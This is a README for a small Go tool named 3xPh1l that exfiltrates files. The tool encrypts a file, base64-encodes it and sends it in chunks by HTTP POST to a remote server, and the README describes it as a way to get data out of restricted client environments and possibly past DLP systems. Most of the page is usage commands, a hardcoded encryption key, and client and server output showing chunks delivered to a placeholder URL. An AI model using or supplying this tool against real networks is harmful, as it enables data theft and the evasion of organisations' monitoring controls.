3xPh1l is a really simple file exfiltration tool, designed to be used in restricted client envs where you might need to exfiltrate small amounts of data. Potentially avoiding DLP systems.

Currently the tool encrypts symetrically, base 64 encodes the data and then uses HTTP Post requests to send the data. 

The long term goal is to support DNS as well as HTTPS, but this works for now. 

### Known Bugs ###
The tool struggles with files bigger than say, an ssh key file. Therefore it's kind of useless for any sizeable exfiltration. However, I am working on fixing this.

Currently usage:

```sh
go run exfilserver.go
key to encrypt/decrypt : 7ac9acc458e5db743725a559a470b7dcc37c3435795829ced16cc1f26cb5ab73
```

Then go to your client (make sure it's pointed at your URL (you can modify this in the code)

```sh
notroot@consultant-rs:~/tools/b64exfil/Client Side$ go run main.go test.txt 7ac9acc458e5db743725a559a470b7dcc37c3435795829ced16cc1f26cb5ab73
encoded plaintext:
hello my name is Phil
And I am bad at chunking files
but let's keep giving this
a go
shall we


encrypted text
904d3b85ec9e87d8a28d91d8134bc6f87bd68effceeee20233b291b5fae3356f0b188b8176c7400fc1af27328ab7d9d416fa7a40bb4ac1650de19504d5d05c6a3ff3a02bb86db71340afce9a4e254ede3e2bc645e493a661f82f56a6fd9f508313986c3cdc5ba0dabba618094483c57f6e62e5b3536ae87503b77a
ENCODED: OTA0ZDNiODVlYzllODdkOGEyOGQ5MWQ4MTM0YmM2Zjg3YmQ2OGVmZmNlZWVlMjAyMzNiMjkxYjVmYWUzMzU2ZjBiMTg4YjgxNzZjNzQwMGZjMWFmMjczMjhhYjdkOWQ0MTZmYTdhNDBiYjRhYzE2NTBkZTE5NTA0ZDVkMDVjNmEzZmYzYTAyYmI4NmRiNzEzNDBhZmNlOWE0ZTI1NGVkZTNlMmJjNjQ1ZTQ5M2E2NjFmODJmNTZhNmZkOWY1MDgzMTM5ODZjM2NkYzViYTBkYWJiYTYxODA5NDQ4M2M1N2Y2ZTYyZTViMzUzNmFlODc1MDNiNzdh
6
Sending Chunk 0:
OTA0ZDNiODVlYzllODdkOGEyOGQ5MWQ4MTM0YmM2Zjg3YmQ2OGVmZmNlZWVl
http://website/delivery
Sending Chunk 1:
MjAyMzNiMjkxYjVmYWUzMzU2ZjBiMTg4YjgxNzZjNzQwMGZjMWFmMjczMjhh
http://website/delivery
Sending Chunk 2:
YjdkOWQ0MTZmYTdhNDBiYjRhYzE2NTBkZTE5NTA0ZDVkMDVjNmEzZmYzYTAy
http://website/delivery
Sending Chunk 3:
YmI4NmRiNzEzNDBhZmNlOWE0ZTI1NGVkZTNlMmJjNjQ1ZTQ5M2E2NjFmODJm
http://website/delivery
Sending Chunk 4:
NTZhNmZkOWY1MDgzMTM5ODZjM2NkYzViYTBkYWJiYTYxODA5NDQ4M2M1N2Y2
http://website/delivery
Sending Chunk 5:
ZTYyZTViMzUzNmFlODc1MDNiNzdh
http://website/delivery
All chunks sent, sent to /done
328
```
Your server should then have printed the text to it's output:

```sh
Recieved Parcel 0 : OTA0ZDNiODVlYzllODdkOGEyOGQ5MWQ4MTM0YmM2Zjg3YmQ2OGVmZmNlZWVl
Recieved Parcel 1 : MjAyMzNiMjkxYjVmYWUzMzU2ZjBiMTg4YjgxNzZjNzQwMGZjMWFmMjczMjhh
Recieved Parcel 2 : YjdkOWQ0MTZmYTdhNDBiYjRhYzE2NTBkZTE5NTA0ZDVkMDVjNmEzZmYzYTAy
Recieved Parcel 3 : YmI4NmRiNzEzNDBhZmNlOWE0ZTI1NGVkZTNlMmJjNjQ1ZTQ5M2E2NjFmODJm
Recieved Parcel 4 : NTZhNmZkOWY1MDgzMTM5ODZjM2NkYzViYTBkYWJiYTYxODA5NDQ4M2M1N2Y2
Recieved Parcel 5 : ZTYyZTViMzUzNmFlODc1MDNiNzdh
Base64 Encoded Output:
[OTA0ZDNiODVlYzllODdkOGEyOGQ5MWQ4MTM0YmM2Zjg3YmQ2OGVmZmNlZWVl MjAyMzNiMjkxYjVmYWUzMzU2ZjBiMTg4YjgxNzZjNzQwMGZjMWFmMjczMjhh YjdkOWQ0MTZmYTdhNDBiYjRhYzE2NTBkZTE5NTA0ZDVkMDVjNmEzZmYzYTAy YmI4NmRiNzEzNDBhZmNlOWE0ZTI1NGVkZTNlMmJjNjQ1ZTQ5M2E2NjFmODJm NTZhNmZkOWY1MDgzMTM5ODZjM2NkYzViYTBkYWJiYTYxODA5NDQ4M2M1N2Y2 ZTYyZTViMzUzNmFlODc1MDNiNzdh]
OTA0ZDNiODVlYzllODdkOGEyOGQ5MWQ4MTM0YmM2Zjg3YmQ2OGVmZmNlZWVlMjAyMzNiMjkxYjVmYWUzMzU2ZjBiMTg4YjgxNzZjNzQwMGZjMWFmMjczMjhhYjdkOWQ0MTZmYTdhNDBiYjRhYzE2NTBkZTE5NTA0ZDVkMDVjNmEzZmYzYTAyYmI4NmRiNzEzNDBhZmNlOWE0ZTI1NGVkZTNlMmJjNjQ1ZTQ5M2E2NjFmODJmNTZhNmZkOWY1MDgzMTM5ODZjM2NkYzViYTBkYWJiYTYxODA5NDQ4M2M1N2Y2ZTYyZTViMzUzNmFlODc1MDNiNzdh
6
Decoded String
904d3b85ec9e87d8a28d91d8134bc6f87bd68effceeee20233b291b5fae3356f0b188b8176c7400fc1af27328ab7d9d416fa7a40bb4ac1650de19504d5d05c6a3ff3a02bb86db71340afce9a4e254ede3e2bc645e493a661f82f56a6fd9f508313986c3cdc5ba0dabba618094483c57f6e62e5b3536ae87503b77a
hello my name is Phil
And I am bad at chunking files
but let's keep giving this
a go
shall we
```
